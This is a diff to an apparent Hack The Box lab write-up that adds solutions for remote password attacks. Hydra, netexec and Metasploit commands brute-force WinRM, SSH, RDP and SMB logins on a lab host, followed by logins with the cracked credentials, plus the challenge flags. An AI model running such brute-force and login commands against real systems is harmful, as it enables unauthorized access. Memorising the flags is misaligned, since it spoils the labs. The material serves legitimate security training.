@@ -8,7 +8,9 @@
     4. [Writing Custom Wordlists and Rules](#writing-custom-wordlists-and-rules)
     5. [Cracking Protected Files](#cracking-protected-files)
     6. [Cracking Protected Archives](#cracking-protected-archives)
-
+2. [Remote Password Attacks](#remote-password-attacks)
+    1. [Network Services](#network-services)
+    2. [Spraying, Stuffing, and Defaults](#spraying-stuffing-and-defaults)
 ## Password Cracking Techniques
 
 ### Introduction to Password Cracking
@@ -210,3 +212,88 @@
     ```
 
     The answer is `43d95aeed3114a53ac66f01265f9b7af`.
+
+## Remote Password Attacks
+### Network Services
+#### Tools
+1. netexec (nxc)
+2. evil-winrm
+3. hydra
+
+#### Challenges
+1. Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+    We can use netexec to solve this.
+
+    ```bash
+    netexec winrm 10.129.202.136 -u username.list -p password.list --threads 103
+    ```
+
+    Then after we get username and password, we can login using `evil-winrm`.
+    ```bash
+    evil-winrm -i 10.129.202.136 -u john -p november
+    ```
+    The answer is `HTB{That5Novemb3r}`.
+
+2. Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+    We can use hydra to solve this.
+
+    ```bash
+    hydra -L username.list -P password.list ssh://10.129.202.136
+    ```
+
+    We get user `dennis` with password `rockstar`. The answer is `HTB{Let5R0ck1t}`.
+
+3. Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+    We can use hydra again to solve this.
+
+    ```bash
+    hydra -L username.list -P password.list -t 4 rdp://10.129.202.136
+    ```
+    Then we login using the credential that we found.
+
+    ```bash
+    xfreerdp /v:10.129.202.136 /u:chris /p:789456123
+    ```
+    The answer is `HTB{R3m0t3DeskIsw4yT00easy}`.
+
+4. Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
+
+    We can solve this using metasploit. 
+    ```bash
+    [msf](Jobs:0 Agents:0) >> use auxiliary/scanner/smb/smb_login
+    [*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+    [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set user_file username.list
+    user_file => username.list
+    [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set pass_file password.list
+    pass_file => password.list
+    [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set rhosts 10.129.202.136
+    rhosts => 10.129.202.136
+    ```
+    After we got the credential, we use netexec to list the share folders.
+    ```bash
+    netexec smb 10.129.202.136 -u "cassie" -p "12345678910" --shares
+    ```
+    After that we use smbclient to specific folder.
+    ```bash
+    smbclient -U cassie \\\\10.129.202.136\\CASSIE
+    ```
+    The answer is `HTB{S4ndM4ndB33}`.
+
+### Spraying, Stuffing, and Defaults
+#### Tools
+1. netexec 
+2. kerbrute
+3. burpsuite
+4. creds search (python venv)
+#### Challenges
+1. Use the credentials provided to log into the target machine and retrieve the MySQL credentials. Submit them as the answer. (Format: <username>:<password>)
+
+    We can solve this using `creds search`.
+
+    ```bash
+    creds search MySQL
+    ```
+    We tried all of that and we get `superdba:admin` as the right answer.
